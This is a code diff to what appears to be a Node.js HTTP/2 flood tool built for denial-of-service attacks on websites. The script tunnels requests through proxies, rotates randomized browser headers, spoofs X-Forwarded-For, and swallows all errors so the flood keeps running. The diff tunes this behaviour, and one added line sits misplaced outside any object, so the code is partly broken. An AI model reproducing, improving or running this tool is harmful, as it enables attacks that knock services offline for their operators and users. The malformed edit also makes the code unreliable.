@@ -20,9 +20,9 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  ];
+  ],
 
-  const cache_header = [
+  cache_header = [
     'max-age=0',
     'no-cache',
     'no-store',
@@ -35,7 +35,7 @@ const accept_header = [
     'no-cache, no-store,private, s-maxage=604800, must-revalidate',
     'no-cache, no-store,private, max-age=604800, must-revalidate',
   ]
-const language_header = [
+language_header = [
     'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
     'en-US,en;q=0.5',
     'en-US,en;q=0.9',
@@ -266,7 +266,7 @@ if (cluster.isMaster) {
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
      const buffer = new Buffer.from(payload);
      const connection = net.connect({
         host: options.host,
@@ -498,10 +498,12 @@ const randstrsValue = randstrs(10);
         { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
         { "origin": "https://" + parsedTarget.host},
         { "source-ip": randstr(5)  },
+        //{"x-aspnet-version" : randstrsValue},
         { "data-return" :"false"},
         {"X-Forwarded-For" : parsedProxy[0]},
         {"NEL" : val},
         {"dnt" : "1" },
+        { "A-IM": "Feed" },
         {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
        {'Delta-Base' : '12340001'},
        {"te": "trailers"},
@@ -525,14 +527,10 @@ let headers = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 15
+     timeout: 10
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
-    if (error) {
-        connection.close();
-        connection.destroy();
-        return;
-    }
+    if (error) return
 
     connection.setKeepAlive(true, 600000);
     connection.setNoDelay(true)
@@ -577,6 +575,7 @@ let headers = {
         maxFrameSize : 16384,
     },
 });
+createConnection: () => tlsConn,
 client.settings({
   headerTableSize: 65536,
   maxHeaderListSize : 32768,
@@ -640,5 +639,4 @@ setTimeout(StopScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
-
 
